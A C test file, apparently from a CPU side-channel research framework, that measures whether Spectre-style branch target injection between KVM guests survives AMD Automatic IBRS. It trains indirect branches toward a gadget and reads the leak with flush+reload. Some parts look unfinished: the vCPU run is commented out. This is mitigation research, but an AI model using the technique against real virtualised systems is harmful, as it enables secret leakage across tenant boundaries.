/**
 * Automatic IBRS BTI Guest
 *
 * That is the impact of Automatic IBRS on BTI considering the guest? Is is still possible?
 *
 * We consider the attack vectors:
 *  - G -> G
 *
 */

#include "uarf/flush_reload.h"
#include "uarf/jita.h"
#include "uarf/kmod/pi.h"
#include "uarf/kmod/rap.h"
#include "uarf/lib.h"
#include "uarf/log.h"
#include "uarf/spec_lib.h"
#include "uarf/test.h"

#include <ucall_common.h>

#ifdef LOG_TAG
#undef LOG_TAG
#define LOG_TAG LOG_TAG_TEST
#endif

psnip_declare(history, psnip_history);
psnip_declare(src_call_ind, psnip_src_call_ind);
psnip_declare(src_jmp_ind, psnip_src_jmp_ind);
psnip_declare(dst_gadget, psnip_dst_gadget);
psnip_declare(dst_dummy, psnip_dst_dummy);

psnip_declare(exp_guest_bti_jmp, psnip_jmp);

struct TestCaseData {
	uint32_t seed;
	uint32_t num_cands;
	uint32_t num_rounds;
	uint32_t num_train_rounds;
	jita_ctxt_t *jita_main;
	jita_ctxt_t *jita_gadget;
	jita_ctxt_t *jita_dummy;
	bool match_history;
};

struct GuestData {
	union {
		void *code_ptr;
		uint64_t code_addr;
		void (*f)(void);
	};
	struct SpecData spec_data;
};

// Out globals that we also need in our guest
struct GuestData guestData;

stub_t stub_main;
stub_t stub_gadget;
stub_t stub_dummy;

static void run_spec_global(void)
{
	struct SpecData *data = &guestData.spec_data;

	// Ensure we have access to the required data
	// It easier to debug if we fail here that later
	GUEST_ASSERT(*(uint64_t *)data->spec_prim_p || true);
	GUEST_ASSERT(*(uint64_t *)data->spec_dst_p_p || true);
	GUEST_ASSERT(**(uint64_t **)data->spec_dst_p_p || true);
	GUEST_ASSERT(*(uint64_t *)data->fr_buf_p || true);

	asm volatile("lea return_here%=, %%rax\n\t"
		     "pushq %%rax\n\t"
		     "jmp *%0\n\t"
		     "return_here%=:\n\t" ::"r"(data->spec_prim_p),
		     "c"(data)
		     : "rax", "rdx", "rdi", "rsi", "r8", "memory");
}

static void guest_main(void)
{
	GUEST_PRINTF("Guest started\n");

	run_spec_global();

	GUEST_PRINTF("Spec done\n");
	GUEST_DONE();
}

void map_mem_to_guest(struct kvm_vm *vm, uint64_t va, uint64_t size)
{
	LOG_TRACE("(vm: %p, va: 0x%lx, size: %lu)\n", vm, va, size);
	static uint64_t next_slot = NR_MEM_REGIONS;
	static uint64_t used_pages = 0;

	uint64_t va_aligned = ALIGN_DOWN(va, PAGE_SIZE);
	LOG_DEBUG("Aligned 0x%lx to 0x%lx\n", va, va_aligned);

	uint64_t num_pages_to_map = DIV_ROUND_UP(size, PAGE_SIZE);
	uint64_t gpa =
		(vm->max_gfn - used_pages - num_pages_to_map) * PAGE_SIZE;

	LOG_DEBUG(
		"Add %lu pages (required: %lu B) of physical memory to guest at gpa 0x%lx (slot %lu)\n",
		num_pages_to_map, size, gpa, next_slot);
	vm_userspace_mem_region_add(vm, DEFAULT_VM_MEM_SRC, gpa, next_slot,
				    num_pages_to_map, 0);

	LOG_DEBUG("Add mapping in guest for gpa 0x%lx to gva 0x%lx\n", gpa,
		  va_aligned);
	virt_map(vm, va_aligned, gpa, num_pages_to_map);
	used_pages += num_pages_to_map;
	next_slot++;

	uint64_t *addr = addr_gpa2hva(vm, (vm_paddr_t)gpa);
	LOG_DEBUG("Copy %lu bytes from 0x%lx to 0x%lx\n", size, va, _ul(addr));
	memcpy(addr, _ptr(va), size);
}

void map_stub_to_guest(struct kvm_vm *vm, stub_t *stub)
{
	LOG_TRACE("(vm: %p, stub: %p)\n", vm, stub);
	map_mem_to_guest(vm, stub->base_addr, stub->size);
}

static void run_vcpu(struct kvm_vcpu *vcpu)
{
	LOG_TRACE("(vcpu: %p)\n", vcpu);
	struct ucall uc;

	while (true) {
		vcpu_run(vcpu);

		switch (get_ucall(vcpu, &uc)) {
		case UCALL_SYNC:
			return;
		case UCALL_DONE:
			return;
		case UCALL_ABORT:
			REPORT_GUEST_ASSERT(uc);
		case UCALL_PRINTF:
			// allow the guest to print debug information
			printf("guest | %s", uc.buffer);
			break;
		default:
			TEST_FAIL("Unhandled ucall: %ld\nexit_reason: %u (%s)",
				  uc.cmd, vcpu->run->exit_reason,
				  exit_reason_str(vcpu->run->exit_reason));
		}
	}
}

TEST_CASE_ARG(basic, arg)
{
	struct TestCaseData *data = (struct TestCaseData *)arg;
	srand(data->seed);

	struct kvm_vcpu *vcpu;
	struct kvm_vm *vm;

	uint64_t extra_pages = 10 * (3 + 512);

	// struct FrConfig fr = fr_init(8, 6, (size_t[]){0, 1, 2, 3, 5, 10});
	struct FrConfig fr = fr_init(8, 1, NULL);

	stub_main = stub_init();
	stub_gadget = stub_init();
	stub_dummy = stub_init();

	IBPB();

	AUTO_IBRS_ON();
	// AUTO_IBRS_OFF();

	fr_reset(&fr);

	for (size_t c = 0; c < data->num_cands; c++) {
		jita_allocate(data->jita_main, &stub_main, rand47());
		jita_allocate(data->jita_gadget, &stub_gadget, rand47());
		jita_allocate(data->jita_dummy, &stub_dummy, rand47());

		struct history h1 = get_randomized_history();

		struct history h2 =
			data->match_history ? h1 : get_randomized_history();

		struct SpecData train_data = {
			.spec_prim_p = stub_main.addr,
			.spec_dst_p_p = _ul(&stub_gadget.addr),
			.fr_buf_p = fr.buf2.addr,
			.secret = 0,
			.hist = h1,
		};

		struct SpecData signal_data = {
			.spec_prim_p = stub_main.addr,
			.spec_dst_p_p = _ul(&stub_dummy.addr),
			.fr_buf_p = fr.buf.addr,
			.secret = 1,
			.hist = h2,
		};

		for (size_t r = 0; r < data->num_rounds; r++) {
			for (size_t t = 0; t < data->num_train_rounds; t++) {
				guestData.spec_data = train_data;

				// Create VM
				vm = __vm_create_with_one_vcpu(
					&vcpu, extra_pages, guest_main);

				// Sync globals
				sync_global_to_guest(vm, guestData);
				sync_global_to_guest(vm, stub_main);
				sync_global_to_guest(vm, stub_gadget);
				sync_global_to_guest(vm, stub_dummy);

				// Map stubs
				map_stub_to_guest(vm, &stub_main);
				map_stub_to_guest(vm, &stub_gadget);
				map_stub_to_guest(vm, &stub_dummy);

				// Map other memory
				map_mem_to_guest(vm, fr.buf.base_addr,
						 fr.buf_size);
				map_mem_to_guest(vm, fr.buf2.base_addr,
						 fr.buf_size);
				map_mem_to_guest(vm, fr.res_addr, fr.res_size);

				// Run VM
				// run_vcpu(vcpu);
				run_spec_global();

				// Trash VM (TODO: recycle VM somehow)
				kvm_vm_free(vm);
			}

			fr_flush(&fr);

			// clflush_spec_dst(&signal_data);
			// invlpg_spec_dst(&signal_data);
			// prefetcht0(&train_data);
			//
			// // TODO: disable interrupts and preemption
			guestData.spec_data = signal_data;

			// Create VM
			vm = __vm_create_with_one_vcpu(&vcpu, extra_pages,
						       guest_main);

			// Sync globals
			sync_global_to_guest(vm, guestData);
			sync_global_to_guest(vm, stub_main);
			sync_global_to_guest(vm, stub_gadget);
			sync_global_to_guest(vm, stub_dummy);

			// Map stubs
			map_stub_to_guest(vm, &stub_main);
			map_stub_to_guest(vm, &stub_gadget);
			map_stub_to_guest(vm, &stub_dummy);

			// Map other memory
			map_mem_to_guest(vm, fr.buf.base_addr, fr.buf_size);
			map_mem_to_guest(vm, fr.buf2.base_addr, fr.buf_size);
			map_mem_to_guest(vm, fr.res_addr, fr.res_size);

			// Run VM
			// run_vcpu(vcpu);
			run_spec_global();

			// Trash VM (TODO: recycle VM somehow)
			kvm_vm_free(vm);

			fr_reload_binned(&fr, r);
		}

		fr_flush(&fr);

		fr_reload(&fr);
		jita_deallocate(data->jita_main, &stub_main);
		jita_deallocate(data->jita_gadget, &stub_gadget);
		jita_deallocate(data->jita_dummy, &stub_dummy);
	}

	fr_print(&fr);

	fr_deinit(&fr);

	TEST_PASS();
}

static struct TestCaseData data1;
static struct TestCaseData data2;
static struct TestCaseData data3;
static struct TestCaseData data4;

TEST_SUITE()
{
	log_system_level = LOG_LEVEL_INFO;

	uint32_t seed = get_seed();
	LOG_INFO("Using seed: %u\n", seed);
	pi_init();
	rap_init();

	jita_ctxt_t jita_main_call = jita_init();
	jita_ctxt_t jita_main_jmp = jita_init();
	jita_ctxt_t jita_gadget = jita_init();
	jita_ctxt_t jita_dummy = jita_init();

	jita_push_psnip(&jita_main_call, &psnip_history);
	jita_push_psnip(&jita_main_call, &psnip_history);
	jita_push_psnip(&jita_main_call, &psnip_history);
	jita_push_psnip(&jita_main_call, &psnip_history);
	jita_push_psnip(&jita_main_call, &psnip_history);

	jita_clone(&jita_main_call, &jita_main_jmp);

	jita_push_psnip(&jita_main_call, &psnip_src_call_ind);
	jita_push_psnip(&jita_main_jmp, &psnip_src_jmp_ind);

	jita_push_psnip(&jita_gadget, &psnip_dst_gadget);
	jita_push_psnip(&jita_dummy, &psnip_dst_dummy);

	    data1 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 10,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .match_history = true,
    };

    data2 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .match_history = false,
    };

    data3 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .match_history = true,
    };

    data4 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = &jita_main_jmp,
        .jita_gadget = &jita_gadget,
        .jita_dummy = &jita_dummy,
        .match_history = false,
    };

    RUN_TEST_CASE_ARG(basic, &data1);
    // RUN_TEST_CASE_ARG(basic, &data2);
    // RUN_TEST_CASE_ARG(basic, &data3);
    // RUN_TEST_CASE_ARG(basic, &data4);

	pi_deinit();
	rap_deinit();

	return 0;
}
